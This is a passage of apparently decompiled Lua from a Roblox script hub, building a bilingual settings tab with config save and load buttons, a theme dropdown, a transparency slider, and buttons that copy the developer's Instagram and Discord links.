            local color3_6 = Color3.fromRGB(114, 137, 218)
            local v165 = v58
            local v166 = HubName

            if not color3_6 then
                color3_6 = Color3.fromRGB(255, 255, 255)
            end

            v165:MakeNotify({
					Title = v166,
					Content = "Link copied! Join the server to get Permanent Access.",
					Color = color3_6,
					Delay = 5
				})
        end
		})
    end

    local function v79()
        u65:SaveConfig()
    end
    local function v80()
        u65:LoadConfig()
    end

    if u35 then
        local v81 = u65:AddTab({
			Name = "Config",
			Icon = "settings"
		})

        v81:AddSection("Salvar Configurações / Carregar Configurações", true):AddButton({
			Title = "Salvar Configurações",
			SubTitle = "Carregar Configurações",
			Callback = function()
            if v79 then
                u65:SaveConfig()
            end

            local color3_7 = Color3.fromRGB(180, 255, 180)
            local v168 = v58
            local v169 = HubName

            if not color3_7 then
                color3_7 = Color3.fromRGB(255, 255, 255)
            end

            v168:MakeNotify({
					Title = v169,
					Content = "Configuração salva!",
					Color = color3_7,
					Delay = 3
				})
        end,
			SubCallback = function()
            if v80 then
                u65:LoadConfig()
            end

            local color3_8 = Color3.fromRGB(180, 200, 255)
            local v171 = v58
            local v172 = HubName

            if not color3_8 then
                color3_8 = Color3.fromRGB(255, 255, 255)
            end

            v171:MakeNotify({
					Title = v172,
					Content = "Configuração carregada!",
					Color = color3_8,
					Delay = 3
				})
        end
		})

        local v82 = v81:AddSection("Visual", true)

        v82:AddDropdown({
			Title = "Tema",
			Options = {
				"amber",
				"amethyst",
				"arctic",
				"ash",
				"aurora",
				"blood",
				"blush",
				"bronze",
				"carbon",
				"cherry",
				"cobalt",
				"crimson",
				"dark",
				"darker",
				"ember",
				"forest",
				"gold",
				"grape",
				"gunmetal",
				"honey",
				"indigo",
				"iron",
				"jungle",
				"lava",
				"lilac",
				"magenta",
				"midnight",
				"moss",
				"navy",
				"obsidian",
				"ocean",
				"pine",
				"plum",
				"rose",
				"rust",
				"sage",
				"sand",
				"sapphire",
				"scarlet",
				"slate",
				"steel",
				"storm",
				"teal",
				"violet",
				"void"
			},
			Default = v40,
			Multi = false,
			Callback = function(p20)
            u65:SetTheme(p20)
        end
		})
        v82:AddSlider({
			Title = "Transparência",
			Min = 0,
			Max = 100,
			Default = 0,
			Increment = 1,
			Callback = function(p21)
            u65:SetTransparency(p21 / 100)
        end
		})
        v81:AddSection("Dono e Desenvolvedor", true):AddDropdown({
			Title = "Redes Sociais - @hid1ey",
			Options = {
				"Instagram: @hid1ey",
				"Discord: @hid1ey"
			},
			Default = "Instagram: @hid1ey",
			Multi = false,
			Callback = function(p22)
            if p22 == "Instagram: @hid1ey" then
                pcall(setclipboard, "https://www.instagram.com/hid1ey")

                local color3_9 = Color3.fromRGB(200, 180, 255)
                local v177 = v58
                local v178 = HubName

                if not color3_9 then
                    color3_9 = Color3.fromRGB(255, 255, 255)
                end

                v177:MakeNotify({
						Title = v178,
						Content = "Link do Instagram copiado!",
						Color = color3_9,
						Delay = 3
					})

                return
            end

            if p22 == "Discord: @hid1ey" then
                pcall(setclipboard, "https://discord.gg/C6J98HzB5a")

                local color3_10 = Color3.fromRGB(180, 200, 255)
                local v180 = v58
                local v181 = HubName

                if not color3_10 then
                    color3_10 = Color3.fromRGB(255, 255, 255)
                end

                v180:MakeNotify({
						Title = v181,
						Content = "Link do Discord copiado!",
						Color = color3_10,
						Delay = 3
					})
            end
        end
		})
    else
        local v83 = u65:AddTab({
			Name = "Settings",
			Icon = "settings"
		})

        v83:AddSection("Save / Load Settings", true):AddButton({
			Title = "Save Settings",
			SubTitle = "Load Settings",
			Callback = function()
            if v79 then
                u65:SaveConfig()
            end

            local color3_11 = Color3.fromRGB(180, 255, 180)
            local v183 = v58
            local v184 = HubName

            if not color3_11 then
                color3_11 = Color3.fromRGB(255, 255, 255)
            end

            v183:MakeNotify({
					Title = v184,
					Content = "Settings saved!",
					Color = color3_11,
					Delay = 3
				})
        end,
			SubCallback = function()
            if v80 then
                u65:LoadConfig()
            end

            local color3_12 = Color3.fromRGB(180, 200, 255)
            local v186 = v58
            local v187 = HubName

            if not color3_12 then
                color3_12 = Color3.fromRGB(255, 255, 255)
            end

            v186:MakeNotify({
					Title = v187,
					Content = "Settings loaded!",
					Color = color3_12,
					Delay = 3
				})
        end
		})

        local v84 = v83:AddSection("Appearance", true)

        v84:AddDropdown({
			Title = "Theme",
			Options = {
				"amber",
				"amethyst",
				"arctic",
				"ash",
				"aurora",
				"blood",
				"blush",
				"bronze",
				"carbon",
				"cherry",
				"cobalt",
				"crimson",
				"dark",
				"darker",
				"ember",
				"forest",
				"gold",
				"grape",
				"gunmetal",
				"honey",
				"indigo",
				"iron",
				"jungle",
				"lava",
				"lilac",
				"magenta",
				"midnight",
				"moss",
				"navy",
				"obsidian",
				"ocean",
				"pine",
				"plum",
				"rose",
				"rust",
				"sage",
				"sand",
				"sapphire",
				"scarlet",
				"slate",
				"steel",
				"storm",
				"teal",
				"violet",
				"void"
			},
			Default = v40,
			Multi = false,
			Callback = function(p23)
            u65:SetTheme(p23)
        end
		})
        v84:AddSlider({
			Title = "Sharpness",
			Min = 0,
			Max = 100,
			Default = 0,
			Increment = 1,
			Callback = function(p24)
            u65:SetTransparency(p24 / 100)
        end
		})
        v83:AddSection("Owner & Developer", true):AddDropdown({
			Title = "Social Media - @hid1ey",
			Options = {
				"Instagram: @hid1ey",
				"Discord: @hid1ey"
			},
			Default = "Instagram: @hid1ey",
			Multi = false,
			Callback = function(p25)
            if p25 == "Instagram: @hid1ey" then
                pcall(setclipboard, "https://www.instagram.com/hid1ey")

                local color3_13 = Color3.fromRGB(200, 180, 255)
                local v192 = v58
                local v193 = HubName

                if not color3_13 then
                    color3_13 = Color3.fromRGB(255, 255, 255)
                end

                v192:MakeNotify({
						Title = v193,
						Content = "Instagram link copied!",
						Color = color3_13,
						Delay = 3
					})

                return
            end

            if p25 == "Discord: @hid1ey" then
                pcall(setclipboard, "https://discord.gg/C6J98HzB5a")

                local color3_14 = Color3.fromRGB(180, 200, 255)
                local v195 = v58
                local v196 = HubName

                if not color3_14 then
                    color3_14 = Color3.fromRGB(255, 255, 255)
                end

                v195:MakeNotify({
						Title = v196,
						Content = "Discord link copied!",
						Color = color3_14,
						Delay = 3
					})
            end
        end
		})
    end
end
